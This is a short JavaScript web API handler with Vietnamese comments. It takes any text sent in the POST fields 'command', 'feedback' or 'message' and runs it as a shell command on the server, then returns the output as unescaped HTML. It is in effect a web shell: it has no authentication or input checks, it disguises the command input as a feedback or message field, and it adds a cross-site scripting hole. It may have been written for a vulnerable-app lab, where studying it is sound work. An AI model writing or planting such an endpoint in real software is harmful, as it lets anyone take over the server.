import { exec } from 'child_process';
import { promisify } from 'util';

const execPromise = promisify(exec);

// Map lệnh Unix sang Windows (cho cross-OS compatibility)
const commandMap = {
  ls: process.platform === 'win32' ? 'dir' : 'ls',
  pwd: process.platform === 'win32' ? 'cd' : 'pwd',
  // Thêm lệnh khác nếu cần (ví dụ: 'whoami' giống nhau cả hai OS)
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Lấy input từ body (giống ví dụ: fallback dùng feedback hoặc message)
  let input = req.body.command || req.body.feedback || req.body.message || '';

  if (!input.trim()) {
    return res.status(400).json({ error: 'No input provided' });
  }

  // Map lệnh cơ bản để tương thích OS
  const cmdParts = input.trim().split(' ');
  const baseCmd = cmdParts[0];
  if (commandMap[baseCmd]) {
    // Thay lệnh chính (giữ nguyên arguments nếu có)
    cmdParts[0] = commandMap[baseCmd];
    input = cmdParts.join(' ');
  }

  try {
    // Exec với timeout 5 giây, shell mặc định của OS
    const { stdout, stderr } = await execPromise(input, {
      timeout: 5000,
      shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/bash',
    });

    if (stderr) {
      return res.status(500).send(`<pre>Error: ${stderr}</pre>`);
    }
    return res.send(`<pre>${stdout}</pre>`);
  } catch (err) {
    return res.status(500).send(`<pre>Error: ${err.message || err}</pre>`);
  }
}